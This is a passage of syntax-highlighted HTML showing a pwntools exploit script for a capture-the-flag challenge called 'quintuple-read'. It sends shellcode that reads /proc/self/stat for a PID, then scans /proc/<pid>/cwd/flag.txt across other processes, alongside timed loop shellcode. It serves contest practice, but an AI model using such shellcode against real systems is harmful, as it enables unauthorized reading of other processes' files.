style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#393A34">res3</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">p2 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">search</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res4 </span><span style="color:#999999">=</span><span style="color:#393A34"> p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#393A34">res4</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">p2 </span><span style="color:#999999">=</span><span style="color:#393A34"> getio</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/5):</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">search</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res5 </span><span style="color:#999999">=</span><span style="color:#393A34"> p2</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p2</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#393A34">res5</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">#</span><br><span style="color:#393A34">p1</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> textwrap</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./binary</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">quintuple-read.challs.infobahnc.tf</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1337</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> io</span><br><br><br><span style="color:#758575DD"># 这个函数通过读取远程的 /proc/self/stat 获取当前的 pid，缩小 pid 遍历范围</span><br><span style="color:#CB7676">def</span><span style="color:#80A665"> getpid</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">48b801010101010101015048b86d672e72756075014831042448b82f70726f632f7365504889e731d231f66a02580f054889c731c031d2b6104889e60f056a015f4889c24889e66a01580f05</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">stdout: b'</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pid </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> (binary) R</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pid</span><br><br><br><span style="color:#C99076">PROC_STR</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/proc/</span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">TAIL_STR</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/cwd/flag.txt</span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">PREFIX_STR</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[+] Found flag from PID </span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">SUFFIX_STR</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">NOW_FLAG_STR</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">now flag</span><span style="color:#C98A7D77">"</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> search_flag</span><span style="color:#5eaab5">(</span><br><span style="color:#DBD7CAEE">    start_pid</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    end_pid</span><span style="color:#666666">:</span><span style="color:#B8A965"> int</span><span style="color:#666666">,</span><br><span style="color:#DBD7CAEE">    buf_size</span><span style="color:#666666">:</span><span style="color:#B8A965"> int</span><span style="color:#666666"> =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><br><span style="color:#5eaab5">)</span><span style="color:#666666"> -</span><span style="color:#666666">></span><span style="color:#B8A965"> bytes</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> start_pid </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> end_pid </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        raise</span><span style="color:#B8A965"> ValueError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">start_pid and end_pid must be non-negative</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> start_pid </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> end_pid</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        raise</span><span style="color:#B8A965"> ValueError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">start_pid must be &#x3C;= end_pid</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    open_sc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">open</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">rdi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    read_sc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">rdi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r15</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf_size</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_prefix </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#C99076">PREFIX_STR</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_suffix </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#C99076">SUFFIX_STR</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_digits </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r8</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r15</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r11</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_newline </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write_now_flag </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsi</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#C99076">NOW_FLAG_STR</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"""</span><br><span style="color:#C98A7D">        cld</span><br><span style="color:#C98A7D">        sub rsp, 0x200</span><br><span style="color:#C98A7D">        mov r13, rsp              /* path buffer */</span><br><span style="color:#C98A7D">        lea r14, [r13 + 0x40]     /* digits scratch */</span><br><span style="color:#C98A7D">        lea r15, [r14 + 0x20]     /* read buffer */</span><br><span style="color:#C98A7D">        mov r12d, </span><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">start_pid</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">     /* current PID */</span><br><span style="color:#C98A7D">        mov r10d, </span><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">end_pid</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">       /* max PID */</span><br><span style="color:#C98A7D">    loop_start:</span><br><span style="color:#C98A7D">        mov eax, r12d</span><br><span style="color:#C98A7D">        mov ecx, 10</span><br><span style="color:#C98A7D">        lea r9, [r14 + 0x10]</span><br><span style="color:#C98A7D">        mov byte ptr [r9], 0</span><br><span style="color:#C98A7D">        mov r8, r9</span><br><span style="color:#C98A7D">    build_digits:</span><br><span style="color:#C98A7D">        xor edx, edx</span><br><span style="color:#C98A7D">        div ecx</span><br><span style="color:#C98A7D">        add dl, '0'</span><br><span style="color:#C98A7D">        dec r8</span><br><span style="color:#C98A7D">        mov [r8], dl</span><br><span style="color:#C98A7D">        test eax, eax</span><br><span style="color:#C98A7D">        jnz build_digits</span><br><span style="color:#C98A7D">        mov rdx, r9</span><br><span style="color:#C98A7D">        sub rdx, r8</span><br><span style="color:#C98A7D">        mov rbp, rdx              /* digit count */</span><br><span style="color:#C98A7D">        lea rdi, [r13]</span><br><span style="color:#C98A7D">        lea rsi, [rip + proc_str]</span><br><span style="color:#C98A7D">        mov ecx, </span><span style="color:#5eaab5">{</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#C99076">PROC_STR</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        rep movsb</span><br><span style="color:#C98A7D">        mov rsi, r8</span><br><span style="color:#C98A7D">        mov rcx, rbp</span><br><span style="color:#C98A7D">        rep movsb</span><br><span style="color:#C98A7D">        lea rsi, [rip + tail_str]</span><br><span style="color:#C98A7D">        mov ecx, </span><span style="color:#5eaab5">{</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#C99076">TAIL_STR</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        rep movsb</span><br><span style="color:#C98A7D">        mov byte ptr [rdi], 0</span><br><span style="color:#C98A7D">        mov rdi, r13</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">open_sc</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        test rax, rax</span><br><span style="color:#C98A7D">        js next_pid</span><br><span style="color:#C98A7D">        mov rbx, rax              /* fd */</span><br><span style="color:#C98A7D">        mov rdi, rbx</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">read_sc</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        mov r11, rax              /* bytes read */</span><br><span style="color:#C98A7D">        cmp r11, 0</span><br><span style="color:#C98A7D">        jle next_pid</span><br><span style="color:#C98A7D">        lea rsi, [rip + prefix_str]</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_prefix</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        mov rsi, r8</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_digits</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        lea rsi, [rip + suffix_str]</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_suffix</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        mov rsi, r15</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_payload</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        lea rsi, [rip + newline_str]</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_newline</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        jmp print_local</span><br><span style="color:#C98A7D">    next_pid:</span><br><span style="color:#C98A7D">        inc r12d</span><br><span style="color:#C98A7D">        cmp r12d, r10d</span><br><span style="color:#C98A7D">        jle loop_start</span><br><span style="color:#C98A7D">        mov r12d, </span><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">start_pid</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        jmp loop_start</span><br><span style="color:#C98A7D">    print_local:</span><br><span style="color:#C98A7D">        lea rsi, [rip + now_flag_str]</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_now_flag</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">        lea rsi, [rip + newline_str]</span><br><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">write_newline</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">    """</span><br><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">open</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./flag.txt</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">rax</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r15</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf_size</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r15</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rax</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">+=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">        ud2</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#DBD7CAEE">    asm_code </span><span style="color:#666666">+=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"""</span><br><span style="color:#C98A7D">    proc_str:</span><br><span style="color:#C98A7D">        .ascii "</span><span style="color:#5eaab5">{</span><span style="color:#C99076">PROC_STR</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#C98A7D">    tail_str:</span><br><span style="color:#C98A7D">        .ascii "</span><span style="color:#5eaab5">{</span><span style="color:#C99076">TAIL_STR</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#C98A7D">    prefix_str:</span><br><span style="color:#C98A7D">        .ascii "</span><span style="color:#5eaab5">{</span><span style="color:#C99076">PREFIX_STR</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#C98A7D">    suffix_str:</span><br><span style="color:#C98A7D">        .ascii "</span><span style="color:#5eaab5">{</span><span style="color:#C99076">SUFFIX_STR</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#C98A7D">    newline_str:</span><br><span style="color:#C98A7D">        .byte 0x0a</span><br><span style="color:#C98A7D">    now_flag_str:</span><br><span style="color:#C98A7D">        .ascii "</span><span style="color:#5eaab5">{</span><span style="color:#C99076">NOW_FLAG_STR</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#C98A7D">    """</span><br><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm_code</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#C99076">TOTAL_PREFIX</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">total cycles: </span><span style="color:#C98A7D77">"</span><br><span style="color:#C99076">AVG_PREFIX</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">avg cycles: </span><span style="color:#C98A7D77">"</span><br><br><br><span style="color:#DBD7CAEE">pid </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getpid</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sc1 </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">mov ecx, 0x05b9b9b9; loop_here: loop loop_here;</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # 0x04b9b9b9 可以改</span><br><span style="color:#DBD7CAEE">sc2 </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">push 0x131A1A1A; pop rcx; loop_dec: dec rcx; jnz loop_dec</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # 0x121A1A1A 可以改</span><br><span style="color:#DBD7CAEE">sc3 </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">add ecx, 0x388b0d0d</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">loop_eq: cmp al, al; loope loop_eq;</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # \x8b\x0d\x8b\xe1 可以</span><br><span style="color:#DBD7CAEE">sc4 </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">nop</span><br><span style="color:#C98A7D">nop</span><br><span style="color:#C98A7D">nop</span><br><span style="color:#C98A7D">jrcxz  done</span><br><span style="color:#C98A7D">sub    cl, 1</span><br><span style="color:#C98A7D">mov    edx, 0x03090909</span><br><span style="color:#C98A7D">inner:</span><br><span style="color:#C98A7D">    sub    edx, 1</span><br><span style="color:#C98A7D">    test   edx, edx</span><br><span style="color:#C98A7D">    jg     inner</span><br><span style="color:#C98A7D">    jmp    short $-0x13</span><br><span style="color:#C98A7D">    nop</span><br><span style="color:#C98A7D">done:</span><br><span style="color:#C98A7D77">"""</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # 0x03090909 可以改</span><br><span style="color:#758575DD"># loop_start:</span><br><span style="color:#758575DD">#     inc ecx</span><br><span style="color:#758575DD">#     inc ecx</span><br><span style="color:#758575DD">#     loopne loop_start</span><br><span style="color:#DBD7CAEE">sc5 </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">        mov     ebx, 0x33333333</span><br><span style="color:#C98A7D">        mov     ecx, ebx</span><br><span style="color:#C98A7D">loop5:  or      al, 0x33</span><br><span style="color:#C98A7D">        or      al, 0x33</span><br><span style="color:#C98A7D">        loopne  loop5</span><br><span style="color:#C98A7D77">"""</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#758575DD"> # 0x33333333 可以改</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">search </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search_flag</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pid </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">800</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span 